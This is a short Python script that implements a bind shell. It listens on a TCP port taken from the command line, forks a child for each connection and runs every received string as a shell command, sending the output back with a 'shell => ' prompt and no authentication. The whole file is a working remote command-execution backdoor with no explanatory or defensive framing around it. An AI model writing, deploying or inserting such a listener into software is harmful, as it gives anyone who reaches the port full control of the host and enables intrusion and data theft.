import os,sys
import socket
import time
from subprocess import Popen,PIPE,STDOUT,call

HOST = ''                              
PORT = int(sys.argv[1])
socksize = 4096                            
activePID = []

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.bind((HOST, PORT))
conn.listen(5)
print("Listening on TCP port %s" % PORT)

def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)


def handler(connection):                    
    time.sleep(3)     

    while True:                                     
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
              shell=True,
             stdout=PIPE,
             stderr=PIPE,
              stdin=PIPE,
              )
        stdout, stderr = proc.communicate()

        print(cmd)

        if cmd == ":killme":
            connection.close()
            sys.exit(0)

        elif proc:
            connection.send( stdout )
            connection.send("\nshell => ".encode())

    connection.close() 
    os._exit(0)


def accept():                                
    while 1:   
        global connection                                  
        connection, address = conn.accept()
        print("[!] New connection!")
        connection.send("\nshell => ".encode())
        reaper()
        childPid = os.fork()                     # forks the incoming connection and sends to conn handler
        if childPid == 0:
            handler(connection)
        else:
            activePID.append(childPid)

accept()

